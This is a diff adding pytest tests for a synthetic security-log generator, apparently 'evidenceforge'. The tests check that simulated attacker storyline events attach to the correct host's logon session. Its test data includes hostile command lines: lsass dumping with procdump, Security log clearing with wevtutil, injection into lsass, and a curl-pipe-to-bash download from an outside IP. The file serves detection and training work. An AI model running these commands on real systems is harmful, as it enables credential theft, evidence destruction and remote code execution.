@@ -1,0 +1,938 @@
+# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+# SPDX-License-Identifier: MIT
+
+"""Tests for LogonID system scoping — processes use the correct host's session."""
+
+from datetime import UTC, datetime, timedelta
+from types import SimpleNamespace
+from unittest.mock import Mock
+
+import pytest
+
+from evidenceforge.generation.activity import ActivityGenerator
+from evidenceforge.generation.engine.storyline import StorylineMixin
+from evidenceforge.generation.state_manager import StateManager
+from evidenceforge.models import System, User
+from evidenceforge.models.exceptions import StateError
+from evidenceforge.models.scenario import (
+    LogonEventSpec,
+    ProcessAccessEventSpec,
+    ProcessEventSpec,
+)
+
+
+@pytest.fixture
+def state_manager():
+    sm = StateManager()
+    sm.set_current_time(datetime(2024, 3, 15, 10, 0, 0, tzinfo=UTC))
+    return sm
+
+
+@pytest.fixture
+def mock_emitters():
+    return {
+        "windows_event_security": Mock(),
+        "zeek_conn": Mock(),
+        "ecar": Mock(),
+        "syslog": Mock(),
+    }
+
+
+@pytest.fixture
+def system_a():
+    return System(hostname="WKS-A", ip="10.0.10.1", os="Windows 10", type="workstation")
+
+
+@pytest.fixture
+def system_b():
+    return System(hostname="SRV-B", ip="10.0.10.2", os="Windows Server 2019", type="server")
+
+
+@pytest.fixture
+def attacker():
+    return User(username="attacker", full_name="Attacker", email="a@evil.com", enabled=True)
+
+
+class TestLogonIdSystemScoping:
+    """Verify processes on system B use system B's LogonID, not system A's."""
+
+    def _build_engine(self, state_manager, mock_emitters, systems, users):
+        """Build a minimal engine with StorylineMixin."""
+        ag = ActivityGenerator(state_manager, mock_emitters)
+        engine = type("FakeEngine", (StorylineMixin,), {}).__new__(
+            type("FakeEngine", (StorylineMixin,), {})
+        )
+        engine.state_manager = state_manager
+        engine.activity_generator = ag
+        engine.dispatcher = ag.dispatcher
+        engine.scenario = Mock()
+        engine.scenario.environment.systems = systems
+        engine.scenario.environment.users = users
+        engine.scenario.storyline = []
+        engine.malicious_events = []
+        engine._system_pids = {}
+        engine._created_account_sids = {}
+        ag._system_pids = {}
+        return engine
+
+    def test_process_uses_target_system_logon_id(
+        self, state_manager, mock_emitters, system_a, system_b, attacker
+    ):
+        """Process on system B should use system B's LogonID, not system A's."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a, system_b], [attacker])
+
+        # Create sessions on both systems with different LogonIDs
+        logon_id_a = state_manager.create_session(
+            username="attacker",
+            system="WKS-A",
+            logon_type=2,
+            source_ip="10.0.10.1",
+        )
+        logon_id_b = state_manager.create_session(
+            username="attacker",
+            system="SRV-B",
+            logon_type=10,
+            source_ip="10.0.10.1",
+        )
+        assert logon_id_a != logon_id_b
+
+        # Seed a parent process on system B for the process to use
+        state_manager.create_process(
+            "SRV-B", 4, r"C:\Windows\explorer.exe", "explorer.exe", "attacker", "Medium"
+        )
+
+        # Spy on generate_process to capture the logon_id argument
+        original_generate = engine.activity_generator.generate_process
+        captured_logon_ids = []
+
+        def spy_generate(*args, **kwargs):
+            captured_logon_ids.append(kwargs.get("logon_id"))
+            return original_generate(*args, **kwargs)
+
+        engine.activity_generator.generate_process = spy_generate
+
+        spec = Mock()
+        spec.type = "process"
+        spec.process_name = r"C:\Windows\System32\cmd.exe"
+        spec.command_line = "cmd.exe /c whoami"
+        spec.supplementary = None
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_b,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Execute command on server",
+            explicit_types={"process"},
+        )
+
+        # The process should use system B's LogonID, not system A's
+        assert len(captured_logon_ids) == 1
+        assert captured_logon_ids[0] == logon_id_b
+
+    def test_storyline_type9_resolves_local_caller_and_outbound_actor(
+        self, state_manager, mock_emitters, system_a
+    ):
+        """Typed Type 9 preserves the local token owner for its child process."""
+        local_user = User(
+            username="local.user",
+            full_name="Local User",
+            email="local.user@example.com",
+            enabled=True,
+        )
+        outbound_user = User(
+            username="domain.admin",
+            full_name="Domain Admin",
+            email="domain.admin@example.com",
+            enabled=True,
+        )
+        system = system_a.model_copy(update={"assigned_user": local_user.username})
+        engine = self._build_engine(
+            state_manager,
+            mock_emitters,
+            [system],
+            [local_user, outbound_user],
+        )
+        engine.world_planner = Mock()
+        engine.scenario.environment.service_accounts = []
+        event_time = datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC)
+        caller_logon_id = state_manager.create_session(
+            username=local_user.username,
+            system=system.hostname,
+            logon_type=2,
+            source_ip="-",
+            session_kind="interactive",
+        )
+
+        result = engine._execute_typed_event(
+            spec=LogonEventSpec(logon_type=9, source_ip="10.0.10.1"),
+            actor=outbound_user,
+            system=system,
+            time=event_time,
+            activity="Use alternate network credentials",
+            explicit_types={"logon", "process"},
+        )
+        type9_id = result["logon_id"]
+        type9 = state_manager.get_session(type9_id)
+        assert type9 is not None
+        assert type9.username == local_user.username
+        assert type9.source_ip == "-"
+        assert type9.session_id == 0
+        assert (
+            engine._last_storyline_logon_for_actor_system(
+                outbound_user,
+                system,
+                at_time=event_time + timedelta(seconds=1),
+            )
+            == type9_id
+        )
+
+        process_result = engine._execute_typed_event(
+            spec=ProcessEventSpec(
+                process_name=r"C:\Windows\System32\cmd.exe",
+                command_line="cmd.exe /c whoami",
+            ),
+            actor=outbound_user,
+            system=system,
+            time=event_time + timedelta(seconds=1),
+            activity="Use alternate network credentials",
+            explicit_types={"logon", "process"},
+        )
+        emitted = [
+            call.args[0] for call in mock_emitters["windows_event_security"].emit.call_args_list
+        ]
+        running_child = state_manager.get_process(system.hostname, process_result["pid"])
+        assert running_child is not None
+        assert running_child.logon_id == type9_id
+        type9_event = next(
+            event for event in emitted if event.event_type == "logon" and event.auth.logon_type == 9
+        )
+        child = next(
+            event
+            for event in emitted
+            if event.event_type == "process_create" and event.process.pid == process_result["pid"]
+        )
+        assert type9_event.auth.cloned_from_logon_id == caller_logon_id
+        assert type9_event.auth.username == local_user.username
+        assert type9_event.auth.outbound_username == outbound_user.username
+        assert child.auth.logon_id == type9_id
+        assert child.auth.username == local_user.username
+        assert running_child.username == local_user.username
+
+    def test_storyline_type9_rejects_missing_local_desktop(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Typed Type 9 fails rather than inventing a caller desktop."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+
+        with pytest.raises(StateError, match="requires an active local desktop caller"):
+            engine._execute_typed_event(
+                spec=LogonEventSpec(logon_type=9),
+                actor=attacker,
+                system=system_a,
+                time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+                activity="Use alternate network credentials",
+                explicit_types={"logon"},
+            )
+
+    def test_process_auto_creates_session_on_new_system(
+        self, state_manager, mock_emitters, system_a, system_b, attacker
+    ):
+        """If no session on target system, auto-create one (type 3)."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a, system_b], [attacker])
+
+        # Only create session on system A
+        state_manager.create_session(
+            username="attacker",
+            system="WKS-A",
+            logon_type=2,
+            source_ip="10.0.10.1",
+        )
+
+        spec = Mock()
+        spec.type = "process"
+        spec.process_name = r"C:\Windows\System32\cmd.exe"
+        spec.command_line = "cmd.exe"
+        spec.supplementary = None
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_b,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Execute command",
+            explicit_types={"process"},
+        )
+
+        # A new session should have been created on system B
+        sessions = state_manager.get_sessions_for_user("attacker")
+        b_sessions = [s for s in sessions if s.system == "SRV-B"]
+        assert len(b_sessions) == 1
+        assert b_sessions[0].logon_type == 3  # Network logon
+
+    def test_logoff_targets_correct_system(
+        self, state_manager, mock_emitters, system_a, system_b, attacker
+    ):
+        """Logoff on system B should end system B's session, not system A's."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a, system_b], [attacker])
+
+        state_manager.create_session(
+            username="attacker",
+            system="WKS-A",
+            logon_type=2,
+            source_ip="10.0.10.1",
+        )
+        state_manager.create_session(
+            username="attacker",
+            system="SRV-B",
+            logon_type=10,
+            source_ip="10.0.10.1",
+        )
+
+        spec = Mock()
+        spec.type = "logoff"
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_b,
+            time=datetime(2024, 3, 15, 11, 0, 0, tzinfo=UTC),
+            activity="Log off server",
+            explicit_types={"logoff"},
+        )
+
+        # System A session should still exist
+        sessions = state_manager.get_sessions_for_user("attacker")
+        remaining_systems = {s.system for s in sessions}
+        assert "WKS-A" in remaining_systems
+
+    def test_storyline_process_access_uses_last_process_as_source(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Typed process_access should emit Sysmon Event 10 from the prior process."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        state_manager.set_current_time(datetime(2024, 3, 15, 10, 29, 0, tzinfo=UTC))
+        pid = state_manager.create_process(
+            "WKS-A",
+            4,
+            r"C:\Windows\Temp\procdump64.exe",
+            r"C:\Windows\Temp\procdump64.exe -ma lsass.exe",
+            attacker.username,
+            "High",
+            logon_id="0x12345",
+        )
+        engine._record_last_storyline_process(
+            system_a,
+            pid,
+            r"C:\Windows\Temp\procdump64.exe",
+        )
+        engine.activity_generator.generate_process_access = Mock()
+
+        spec = Mock()
+        spec.type = "process_access"
+        spec.target_process = "lsass.exe"
+        spec.access_mask = "0x1010"
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_a,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Dump credentials",
+            explicit_types={"process_access"},
+        )
+
+        engine.activity_generator.generate_process_access.assert_called_once()
+        kwargs = engine.activity_generator.generate_process_access.call_args.kwargs
+        assert kwargs["source_pid"] == pid
+        assert kwargs["source_image"] == r"C:\Windows\Temp\procdump64.exe"
+        assert kwargs["target_image"] == r"C:\Windows\System32\lsass.exe"
+        assert kwargs["granted_access"] == "0x1010"
+
+    def test_storyline_create_remote_thread_normalizes_target_image(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Typed create_remote_thread should share full target image paths across sources."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        state_manager.set_current_time(datetime(2024, 3, 15, 10, 29, 0, tzinfo=UTC))
+        pid = state_manager.create_process(
+            "WKS-A",
+            4,
+            r"C:\Windows\Temp\procdump64.exe",
+            r"C:\Windows\Temp\procdump64.exe -ma lsass.exe",
+            attacker.username,
+            "High",
+            logon_id="0x12345",
+        )
+        engine._record_last_storyline_process(
+            system_a,
+            pid,
+            r"C:\Windows\Temp\procdump64.exe",
+        )
+        engine.activity_generator.generate_create_remote_thread = Mock()
+        engine.activity_generator._expand_and_emit = Mock()
+        engine.activity_generator._system_pids = {"WKS-A": {"lsass": 620}}
+
+        spec = Mock()
+        spec.type = "create_remote_thread"
+        spec.target_process = "lsass.exe"
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_a,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Inject into lsass",
+            explicit_types={"create_remote_thread"},
+        )
+
+        kwargs = engine.activity_generator.generate_create_remote_thread.call_args.kwargs
+        assert kwargs["target_pid"] == 620
+        assert kwargs["target_image"] == r"C:\Windows\System32\lsass.exe"
+        engine.activity_generator._expand_and_emit.assert_not_called()
+
+    def test_storyline_process_access_with_stale_source_is_marked_skipped(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Typed process_access should not claim evidence when remembered PID is stale."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        engine._record_last_storyline_process(
+            system_a,
+            4242,
+            r"C:\Windows\Temp\procdump64.exe",
+        )
+        engine.activity_generator.generate_process_access = Mock()
+
+        spec = Mock()
+        spec.type = "process_access"
+        spec.target_process = "lsass.exe"
+        spec.access_mask = "0x1010"
+
+        malicious_event = engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_a,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Dump credentials",
+            explicit_types={"process_access"},
+        )
+
+        engine.activity_generator.generate_process_access.assert_not_called()
+        assert malicious_event["target_process"] == r"C:\Windows\System32\lsass.exe"
+        assert malicious_event["skipped_reason"] == "no_live_source_process"
+
+    def test_storyline_create_remote_thread_with_stale_source_is_marked_skipped(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Typed create_remote_thread should not claim evidence when remembered PID is stale."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        engine._record_last_storyline_process(
+            system_a,
+            4242,
+            r"C:\Windows\Temp\injector.exe",
+        )
+        engine.activity_generator.generate_create_remote_thread = Mock()
+        engine.activity_generator._expand_and_emit = Mock()
+
+        spec = Mock()
+        spec.type = "create_remote_thread"
+        spec.target_process = "lsass.exe"
+
+        malicious_event = engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_a,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Inject into lsass",
+            explicit_types={"create_remote_thread"},
+        )
+
+        engine.activity_generator.generate_create_remote_thread.assert_not_called()
+        engine.activity_generator._expand_and_emit.assert_not_called()
+        assert malicious_event["target_process"] == r"C:\Windows\System32\lsass.exe"
+        assert malicious_event["skipped_reason"] == "no_live_source_process"
+
+    def test_storyline_process_access_with_missing_target_is_marked_skipped(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Typed process_access should not claim evidence when target PID validation skips."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        state_manager.set_current_time(datetime(2024, 3, 15, 10, 29, 0, tzinfo=UTC))
+        pid = state_manager.create_process(
+            "WKS-A",
+            4,
+            r"C:\Windows\Temp\procdump64.exe",
+            r"C:\Windows\Temp\procdump64.exe -ma custom.exe",
+            attacker.username,
+            "High",
+            logon_id="0x12345",
+        )
+        engine._record_last_storyline_process(
+            system_a,
+            pid,
+            r"C:\Windows\Temp\procdump64.exe",
+        )
+        engine.activity_generator.generate_process_access = Mock(return_value=False)
+
+        spec = Mock()
+        spec.type = "process_access"
+        spec.target_process = "custom.exe"
+        spec.access_mask = "0x1010"
+
+        malicious_event = engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_a,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Dump credentials",
+            explicit_types={"process_access"},
+        )
+
+        engine.activity_generator.generate_process_access.assert_called_once()
+        assert malicious_event["target_process"] == r"C:\Windows\System32\custom.exe"
+        assert malicious_event["skipped_reason"] == "no_live_target_process"
+
+    def test_storyline_create_remote_thread_with_missing_target_is_marked_skipped(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Typed create_remote_thread should not claim evidence when target PID validation skips."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        state_manager.set_current_time(datetime(2024, 3, 15, 10, 29, 0, tzinfo=UTC))
+        pid = state_manager.create_process(
+            "WKS-A",
+            4,
+            r"C:\Windows\Temp\injector.exe",
+            r"C:\Windows\Temp\injector.exe custom.exe",
+            attacker.username,
+            "High",
+            logon_id="0x12345",
+        )
+        engine._record_last_storyline_process(
+            system_a,
+            pid,
+            r"C:\Windows\Temp\injector.exe",
+        )
+        engine.activity_generator.generate_create_remote_thread = Mock(return_value=False)
+        engine.activity_generator._expand_and_emit = Mock()
+
+        spec = Mock()
+        spec.type = "create_remote_thread"
+        spec.target_process = "custom.exe"
+
+        malicious_event = engine._execute_typed_event(
+            spec=spec,
+            actor=attacker,
+            system=system_a,
+            time=datetime(2024, 3, 15, 10, 30, 0, tzinfo=UTC),
+            activity="Inject into custom process",
+            explicit_types={"create_remote_thread"},
+        )
+
+        engine.activity_generator.generate_create_remote_thread.assert_called_once()
+        engine.activity_generator._expand_and_emit.assert_not_called()
+        assert malicious_event["target_process"] == r"C:\Windows\System32\custom.exe"
+        assert malicious_event["skipped_reason"] == "no_live_target_process"
+
+    def test_storyline_process_termination_is_deferred_until_step_end(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """Storyline process termination should see same-step dependent activity."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        start = datetime(2024, 3, 15, 10, 0, 0, tzinfo=UTC)
+        state_manager.set_current_time(start)
+        pid = state_manager.create_process(
+            "WKS-A",
+            4,
+            r"C:\Windows\Temp\tool.exe",
+            "tool.exe",
+            attacker.username,
+            "Medium",
+            logon_id="0x12345",
+        )
+        proc = state_manager.get_process("WKS-A", pid)
+        assert proc is not None
+        proc.last_activity_time = start + timedelta(seconds=20)
+        engine.activity_generator.generate_process_termination = Mock()
+
+        engine._queue_story_process_termination(
+            actor=attacker,
+            system=system_a,
+            time=start + timedelta(seconds=5),
+            pid=pid,
+            process_name=r"C:\Windows\Temp\tool.exe",
+            logon_id="0x12345",
+        )
+        engine._flush_story_process_terminations()
+
+        engine.activity_generator.generate_process_termination.assert_called_once()
+        kwargs = engine.activity_generator.generate_process_termination.call_args.kwargs
+        assert kwargs["time"] == start + timedelta(seconds=5)
+        assert kwargs["from_storyline"] is True
+
+    def test_named_process_is_retained_through_implicit_process_access(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """A named process remains the live source through its last implicit effect."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        start = datetime(2024, 3, 15, 10, 0, 0, tzinfo=UTC)
+        state_manager.set_current_time(start)
+        pid = state_manager.create_process(
+            system_a.hostname,
+            4,
+            r"C:\Windows\Temp\stager.exe",
+            "stager.exe",
+            attacker.username,
+            "High",
+            logon_id="0x12345",
+        )
+        engine.scenario.storyline = [
+            SimpleNamespace(
+                actor=attacker.username,
+                system=system_a.hostname,
+                events=[
+                    ProcessEventSpec(
+                        process_name=r"C:\Windows\Temp\stager.exe",
+                        process_ref="stager",
+                    )
+                ],
+            ),
+            SimpleNamespace(
+                actor=attacker.username,
+                system=system_a.hostname,
+                events=[ProcessAccessEventSpec()],
+            ),
+        ]
+        engine._record_storyline_process_ref(
+            actor=attacker,
+            system=system_a,
+            process_ref="stager",
+            pid=pid,
+            image=r"C:\Windows\Temp\stager.exe",
+        )
+        engine._record_last_storyline_process(system_a, 9999, r"C:\Windows\Temp\ended.exe")
+        engine.activity_generator.generate_process_termination = Mock()
+
+        release_index = engine._storyline_process_ref_release_index(
+            actor=attacker,
+            system=system_a,
+            process_ref="stager",
+        )
+        engine._queue_story_process_termination(
+            actor=attacker,
+            system=system_a,
+            time=start + timedelta(seconds=5),
+            pid=pid,
+            process_name=r"C:\Windows\Temp\stager.exe",
+            logon_id="0x12345",
+            release_storyline_index=release_index,
+        )
+
+        engine._flush_story_process_terminations(
+            completed_storyline_index=0,
+            release_time=start + timedelta(seconds=20),
+        )
+        assert engine.activity_generator.generate_process_termination.call_count == 0
+        assert engine._last_storyline_process_for_system(system_a) == (
+            pid,
+            r"C:\Windows\Temp\stager.exe",
+        )
+
+        access_time = start + timedelta(minutes=15)
+        engine._flush_story_process_terminations(
+            completed_storyline_index=1,
+            release_time=access_time,
+        )
+        kwargs = engine.activity_generator.generate_process_termination.call_args.kwargs
+        assert kwargs["pid"] == pid
+        assert kwargs["time"] == access_time + timedelta(milliseconds=1)
+
+    def test_stale_explicit_parent_ref_fails_resolution(
+        self, state_manager, mock_emitters, system_a, attacker
+    ):
+        """An ended named parent cannot silently resolve to a replacement process."""
+        engine = self._build_engine(state_manager, mock_emitters, [system_a], [attacker])
+        engine._record_storyline_process_ref(
+            actor=attacker,
+            system=system_a,
+            process_ref="loader",
+            pid=4242,
+            image=r"C:\Windows\Temp\loader.exe",
+        )
+
+        assert (
+            engine._storyline_process_ref_for_parent(
+                actor=attacker,
+                system=system_a,
+                parent_ref="loader",
+            )
+            is None
+        )
+
+
+class _FixedRng:
+    def uniform(self, a: float, b: float) -> float:
+        return 0.0
+
+    def randint(self, a: int, b: int) -> int:
+        return max(a, 1000)
+
+
+def test_execute_storyline_uses_last_intra_step_timestamp_for_monotonic_ordering(
+    state_manager, mock_emitters, system_a, attacker, monkeypatch
+):
+    """Later storyline steps should be scheduled after prior step cadence offsets."""
+    ag = ActivityGenerator(state_manager, mock_emitters)
+    engine = type("FakeEngine", (StorylineMixin,), {}).__new__(
+        type("FakeEngine", (StorylineMixin,), {})
+    )
+    engine.state_manager = state_manager
+    engine.activity_generator = ag
+    engine.dispatcher = ag.dispatcher
+    engine.malicious_events = []
+    engine._created_account_sids = {}
+    engine.scenario = Mock()
+    engine.scenario.environment.systems = [system_a]
+    engine.scenario.environment.users = [attacker]
+    engine._system_pids = {}
+    ag._system_pids = {}
+    engine._report_progress = lambda *args, **kwargs: None
+    engine._barrier_flush_all_emitters = lambda: None
+    engine._find_actor = lambda actor_name: attacker if actor_name == attacker.username else None
+    engine._find_system = lambda hostname: system_a if hostname == system_a.hostname else None
+
+    step_1 = Mock()
+    step_1.time = "2024-03-15T10:00:00Z"
+    step_1.actor = attacker.username
+    step_1.system = system_a.hostname
+    step_1.activity = "step one"
+    step_1.events = [Mock(type="process"), Mock(type="process")]
+
+    step_2 = Mock()
+    step_2.time = "2024-03-15T10:00:05Z"
+    step_2.actor = attacker.username
+    step_2.system = system_a.hostname
+    step_2.activity = "step two"
+    step_2.events = [Mock(type="process")]
+
+    engine.scenario.storyline = [step_1, step_2]
+    engine.authored_intent_ledger = Mock()
+    engine.authored_intent_ledger.intent_at.side_effect = [
+        Mock(intent_id="intent-1"),
+        Mock(intent_id="intent-2"),
+        Mock(intent_id="intent-3"),
+    ]
+    engine.intent_execution_ledger = Mock()
+
+    parsed_times = {
+        step_1.time: datetime(2024, 3, 15, 10, 0, 0, tzinfo=UTC),
+        step_2.time: datetime(2024, 3, 15, 10, 0, 5, tzinfo=UTC),
+    }
+    monkeypatch.setattr(engine, "_parse_storyline_time", lambda t: parsed_times[t])
+    monkeypatch.setattr("evidenceforge.generation.engine.storyline._get_rng", lambda: _FixedRng())
+
+    def fake_typing_cadence(count: int, _rng: _FixedRng) -> list[float]:
+        if count == 2:
+            return [0.0, 10.0]
+        return [0.0]
+
+    monkeypatch.setattr("evidenceforge.utils.timing.typing_cadence", fake_typing_cadence)
+
+    observed_times: list[datetime] = []
+
+    def fake_execute_typed_event(
+        *,
+        spec,
+        actor,
+        system,
+        time: datetime,
+        activity: str,
+        explicit_types: set[str],
+        future_specs=(),
+        authored_time_shift: timedelta = timedelta(0),
+        session_required_until: datetime | None = None,
+    ):
+        del authored_time_shift, session_required_until
+        observed_times.append(time)
+        return None
+
+    monkeypatch.setattr(engine, "_execute_typed_event", fake_execute_typed_event)
+
+    engine._execute_storyline()
+
+    assert observed_times == sorted(observed_times)
+    assert observed_times[1] == observed_times[0] + timedelta(seconds=10)
+    assert observed_times[2] > observed_times[1]
+    assert engine.intent_execution_ledger.mark_planned.call_count == 3
+
+
+def test_log_cleared_storyline_event_inherits_recent_wevtutil_logon_id(
+    state_manager, mock_emitters, system_a, attacker, monkeypatch
+):
+    """Typed log_cleared events should stay attached to the clearing process token."""
+    ag = ActivityGenerator(state_manager, mock_emitters)
+    engine = type("FakeEngine", (StorylineMixin,), {}).__new__(
+        type("FakeEngine", (StorylineMixin,), {})
+    )
+    engine.state_manager = state_manager
+    engine.activity_generator = ag
+    engine.dispatcher = ag.dispatcher
+    engine.malicious_events = []
+
+    process_time = datetime(2024, 3, 15, 10, 0, 0, tzinfo=UTC)
+    state_manager.set_current_time(process_time)
+    logon_id = state_manager.create_session(
+        username=attacker.username,
+        system=system_a.hostname,
+        logon_type=2,
+        source_ip=system_a.ip,
+    )
+    pid = state_manager.create_process(
+        system_a.hostname,
+        4,
+        r"C:\Windows\System32\wevtutil.exe",
+        "wevtutil cl Security",
+        attacker.username,
+        "High",
+        logon_id=logon_id,
+    )
+    engine._record_last_storyline_process(system_a, pid, r"C:\Windows\System32\wevtutil.exe")
+
+    captured: dict[str, str | None] = {}
+
+    def fake_generate_log_cleared(*args, **kwargs):
+        captured["subject_logon_id"] = kwargs["subject_logon_id"]
+
+    monkeypatch.setattr(ag, "generate_log_cleared", fake_generate_log_cleared)
+
+    engine._execute_typed_event(
+        spec=Mock(type="log_cleared"),
+        actor=attacker,
+        system=system_a,
+        time=process_time + timedelta(seconds=2),
+        activity="clear security log",
+        explicit_types=set(),
+    )
+
+    assert captured["subject_logon_id"] == logon_id
+
+
+def test_log_cleared_storyline_event_rejects_different_actor_wevtutil_logon_id(
+    state_manager, mock_emitters, system_a, attacker, monkeypatch
+):
+    """Typed log_cleared events must not inherit another actor's process token."""
+    other = User(
+        username="other",
+        full_name="Other User",
+        email="other@example.com",
+        enabled=True,
+    )
+    ag = ActivityGenerator(state_manager, mock_emitters)
+    engine = type("FakeEngine", (StorylineMixin,), {}).__new__(
+        type("FakeEngine", (StorylineMixin,), {})
+    )
+    engine.state_manager = state_manager
+    engine.activity_generator = ag
+    engine.dispatcher = ag.dispatcher
+    engine.malicious_events = []
+
+    process_time = datetime(2024, 3, 15, 10, 0, 0, tzinfo=UTC)
+    state_manager.set_current_time(process_time)
+    other_logon_id = state_manager.create_session(
+        username=other.username,
+        system=system_a.hostname,
+        logon_type=2,
+        source_ip=system_a.ip,
+    )
+    pid = state_manager.create_process(
+        system_a.hostname,
+        4,
+        r"C:\Windows\System32\wevtutil.exe",
+        "wevtutil cl Security",
+        other.username,
+        "High",
+        logon_id=other_logon_id,
+    )
+    engine._record_last_storyline_process(system_a, pid, r"C:\Windows\System32\wevtutil.exe")
+
+    captured: dict[str, str | None] = {}
+
+    def fake_generate_log_cleared(*args, **kwargs):
+        captured["subject_logon_id"] = kwargs["subject_logon_id"]
+
+    monkeypatch.setattr(ag, "generate_log_cleared", fake_generate_log_cleared)
+
+    engine._execute_typed_event(
+        spec=Mock(type="log_cleared"),
+        actor=attacker,
+        system=system_a,
+        time=process_time + timedelta(seconds=2),
+        activity="clear security log",
+        explicit_types=set(),
+    )
+
+    assert captured["subject_logon_id"] is None
+
+
+def test_linux_daemon_storyline_process_does_not_create_service_logon(state_manager):
+    """Linux web-daemon storyline processes should not fabricate user-session logins."""
+    engine = type("FakeEngine", (StorylineMixin,), {}).__new__(
+        type("FakeEngine", (StorylineMixin,), {})
+    )
+    web_system = System(
+        hostname="WEB-EXT-01",
+        ip="10.10.3.10",
+        os="Ubuntu 22.04",
+        type="server",
+        roles=["web_server"],
+    )
+    apache = User(
+        username="apache",
+        full_name="Apache",
+        email="apache@system.local",
+        enabled=True,
+    )
+    activity = Mock()
+    activity.generate_process.return_value = 24119
+    activity._resolve_parent.return_value = 24118
+    engine.activity_generator = activity
+    engine.state_manager = state_manager
+    engine.dispatcher = Mock()
+    engine.world_planner = Mock()
+    engine.scenario = Mock()
+    engine.scenario.environment.service_accounts = ["apache"]
+
+    event = engine._execute_typed_event(
+        ProcessEventSpec(
+            process_name="/bin/bash",
+            command_line="bash -c 'curl -fsSL http://45.33.32.30/p.sh | bash'",
+        ),
+        apache,
+        web_system,
+        datetime(2024, 3, 18, 13, 19, 47, tzinfo=UTC),
+        "Apache spawned shell",
+        {"process"},
+    )
+
+    activity.generate_service_logon.assert_not_called()
+    activity.generate_process.assert_called_once()
+    assert activity.generate_process.call_args.kwargs["logon_id"] == ""
+    assert event["pid"] == 24119
